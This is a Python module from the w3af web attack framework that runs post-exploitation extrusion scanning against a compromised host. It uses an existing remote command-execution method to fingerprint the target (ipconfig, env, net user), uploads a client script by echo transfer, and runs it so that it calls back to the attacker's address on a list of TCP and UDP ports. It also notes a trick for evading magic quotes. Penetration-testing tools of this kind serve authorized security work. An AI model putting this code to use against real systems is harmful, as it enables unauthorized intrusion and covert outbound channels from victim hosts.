'''
extrusionScanner.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''

import hashlib
import os
import socket
import time
import threading

import core.data.kb.config as cf
import core.data.kb.knowledgeBase as kb
import core.controllers.outputManager as om

from core.controllers.extrusionScanning.server.extrusionServer import extrusionServer
from core.controllers.w3afException import w3afException
from core.controllers.intrusionTools.execMethodHelpers import *
from core.controllers.payloadTransfer.echoWin import echoWin
from core.controllers.payloadTransfer.echoLnx import echoLnx


class extrusionScanner(object):
    '''
    This class is a wrapper that performs this process:
        - sends extrusion client to compromised machine
        - starts extrusion server
        - returns results from extrusion server to user
    
    @author: Andres Riancho ( andres.riancho@gmail.com )    
    '''

    def __init__( self, execMethod, forceReRun=False, 
                  tcpPortList=[25,80,53,1433,8080],
                  udpPortList=[53,69,139,1025] ):
        '''
        @parameter execMethod: The execMethod used to execute commands on the
                               remote host
        @parameter forceReRun: If forceReRun is True, the extrusion scanner
                               won't fetch the results from the KB
        '''
        self._execMethod = execMethod
        self._forceReRun = forceReRun
        self._tcpPortList = tcpPortList
        self._udpPortList = udpPortList
        
        os = osDetectionExec( execMethod )
        if os == 'windows':
            self._transferHandler = echoWin( execMethod, os )
        elif os == 'linux':
            self._transferHandler = echoLnx( execMethod, os )
    
    def _getRemoteId( self ):
        '''
        Runs some commands on the remote host, concatenates outputs and creates a hash
        of the results. This will be an unique identifier for the host.
        '''
        om.out.debug('Creating a remote server fingerprint.')
        r = self._exec('ipconfig /all')
        r += self._exec('ifconfig')
        r += self._exec('uname -a')
        r += self._exec('env')
        r += self._exec('net user')

        m = hashlib.md5()
        m.update(r)
        return m.hexdigest()
    
    def isAvailable( self, port, proto ):
        try:
            if proto.lower() == 'tcp':
                serversocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
            if proto.lower() == 'udp':
                serversocket = socket.socket( socket.AF_INET, socket.SOCK_DGRAM)
            serversocket.bind(('', port))
            serversocket.listen(5)
        except:
            return False
        else:
            serversocket.close()
            return True
    
    def estimateScanTime( self ):
        savedResults = kb.kb.getData('extrusionScanner', 'extrusions')
        if savedResults:
            return 1
        else:
            _, file_content, _ = self._selectExtrusionClient()
            return self._transferHandler.estimateTransferTime( len(file_content) ) + 8
    
    def getInboundPort( self, desiredProtocol='TCP' ):
        '''
        Performs the process
        '''
        if not self._forceReRun:
            # Try to return the data from the kb !
            remoteId = self._getRemoteId()
            savedResults = kb.kb.getData('extrusionScanner', 'extrusions')
            if remoteId in savedResults:
                om.out.information('Reusing previous result from the knowledgeBase:' )
                msg = '- Selecting port "%s" for inbound connections from the'
                msg += ' compromised server to w3af.' % savedResults[ remoteId ]
                om.out.information( msg )
                return savedResults[ remoteId ]
            
        om.out.information('Please wait some seconds while w3af performs an extrusion scan.')
        
        es = extrusionServer( self._tcpPortList, self._udpPortList )
        if not es.canSniff():
            msg = 'The user running w3af can\'t sniff on the specified'
            msg += ' interface. Hints: Are you root? Does this interface'
            msg += ' exist?'
            raise w3afException( msg )
        else:
            # I can sniff, it makes sense to send the extrusion client
            interpreter, remoteFilename = self._sendExtrusionClient()
            
            # This sniffs for packets in a new thread
            sniff_thread = threading.Thread(target=es.sniffAndAnalyze)
            sniff_thread.start()
            time.sleep(1)
            
            self._execExtrusionClient( interpreter, remoteFilename )
            
            res = es.getResult()
            om.out.information('Finished extrusion scan.')
            
            if not res:
                msg = 'No inbound ports have been found. Maybe the extrusion'
                msg += ' scan failed ?'
                raise w3afException( msg )
            else:
                host = res[0][0]
                msg = 'The remote host: "%s" can connect to w3af with these ports:'
                om.out.information( msg  % host )
                port = None
                portList = []
                for x in res:
                    if x[0] == host:
                        port = x[1]
                        protocol = x[2]
                        om.out.information('- '+ str(port) + '/' + protocol )
                        portList.append( (port, protocol) )
                
                localPorts = []
                for port, protocol in portList:
                    if self.isAvailable( port, protocol ):
                        localPorts.append( (port, protocol) )
                
                if not localPorts:
                    raise w3afException('All the inbound ports are in use.')
                else:
                    msg = 'The following ports are not bound to a local process'
                    msg += ' and can be used by w3af:'
                    om.out.information( msg )
                    for lp, proto in localPorts:
                        om.out.information('- ' + str(lp) + '/' + proto )
                        
                        # Selecting the highest port
                        if desiredProtocol.upper() == proto.upper():
                            port = lp
                    
                    msg = 'Selecting port "%s/%s" for inbound connections from'
                    msg += ' the compromised server to w3af.'
                    om.out.information( msg % (port,proto) )
                    
                    if not self._forceReRun:
                        om.out.debug('Saving information in the kb.')
                        savedResults = kb.kb.getData('extrusionScanner', 'extrusions' )
                        if savedResults:
                            savedResults[ remoteId ] = port
                        else:
                            savedResults = {}
                            savedResults[ remoteId ] = port
                        kb.kb.save('extrusionScanner', 'extrusions', savedResults )
                            
                    return port
                
    
    def _sendExtrusionClient( self ):
        interpreter, extrusionClient, extension = self._selectExtrusionClient()
        remoteFilename = getRemoteTempFile( self._execMethod )
        remoteFilename += '.' + extension
        
        # do the transfer
        apply( self._transferHandler.transfer , ( extrusionClient, remoteFilename ) )
        
        return interpreter, remoteFilename
    
    def _exec( self, command ):
        '''
        A wrapper for executing commands
        '''
        om.out.debug('Executing: ' + command )
        response = apply( self._execMethod, ( command ,))
        om.out.debug('"' + command + '" returned: ' + response )
        return response
    
    def canScan( self ):
        try:
            self._selectExtrusionClient()
        except:
            return False
        else:
            return True
    
    def _selectExtrusionClient( self ):
        '''
        This method selects the extrusion client to use based on the remote OS 
        and some other factors like:
            - is python installed ?
            - is perl installed ?
            - is phpcli installed ?
            - bash sockets ?
            - gcc compiler ?
        '''
        ### TODO! Implement this!
        if '6' in self._exec('python -c print+3+3'):
            # "python -c 'print 3+3'" fails with magic quotes on... but
            # this trick of the print+3+3 works ( returns 6 ) and ALSO evades magic quotes
            filename = os.path.join( 'core','controllers','extrusionScanning',
                                     'client','extrusionClient.py' )
            fileContent = file( filename ).read()
            extension = 'py'
            interpreter = 'python'
        else:
            msg = 'Failed to find a suitable extrusion scanner client for'
            msg += ' the remote system.'
            raise w3afException( msg )
        
        return interpreter, fileContent, extension

    def _execExtrusionClient( self, interpreter, remoteFilename ):
        cmd = interpreter + ' ' + remoteFilename + ' ' + \
              cf.cf.getData( 'localAddress' ) + ' ' + \
              ','.join( [ str(x) for x in self._tcpPortList ] ) + \
              ' ' + ','.join( [ str(x) for x in self._udpPortList ] )

        res = self._exec( cmd )
        
        if 'OK.' not in res:
            raise w3afException('The extrusion client failed to execute.')
        else:
            om.out.debug('The extrusion client run as expected.')
